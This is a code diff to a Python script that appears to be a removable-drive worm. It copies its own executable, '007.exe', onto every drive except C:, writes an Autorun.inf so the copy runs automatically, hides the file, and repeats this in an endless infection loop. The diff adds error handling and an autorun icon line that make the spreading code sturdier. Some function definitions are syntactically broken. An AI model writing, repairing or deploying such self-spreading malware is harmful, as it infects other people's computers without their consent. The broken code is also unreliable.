@@ -10,6 +10,7 @@ def writeconfig:
     autorun='''
     [autorun]
     open=007.exe
+    icon=007.exe
     '''
     with open("Autorun.inf",'w') as loadautorun:
         loadautorun.write(autorun)
@@ -40,19 +41,23 @@ class infect:
             drivename = chr(drive) + ':\\'
             if os.path.exists(drivename):
                 drives.append(drivename)
-drives.remove("C:\\")
-        for infectwrite in drives:
-            os.chdir(infectwrite)
-            if '007.exe' and 'Autorun.inf' not in os.listdir(infectwrite):
+        drives.remove("C:\\")
+        try:
+            for infectwrite in drives:
                 try:
-                    writeconfig()
-                    with open(filename,'rb') as writethis:
-                        pages=writethis.read()
-                        with open(infectwrite+"007.exe",'wb') as loadthis:
-                            loadthis.write(pages)
-                win32api.SetFileAttributes("007.exe",win32con.FILE_ATTRIBUTE_HIDDEN)
+                    os.chdir(infectwrite)
+                    if '007.exe' and 'Autorun.inf' not in os.listdir(infectwrite):
+                        writeconfig()
+                        with open(filename,'rb') as writethis:
+                            pages=writethis.read()
+                            with open(infectwrite+"007.exe",'wb') as loadthis:
+                                loadthis.write(pages)
+                    win32api.SetFileAttributes("007.exe",win32con.FILE_ATTRIBUTE_HIDDEN)
                 except:
                     pass
+        except:
+            pass
+
 def infecting:
     while True:
         infect().go()
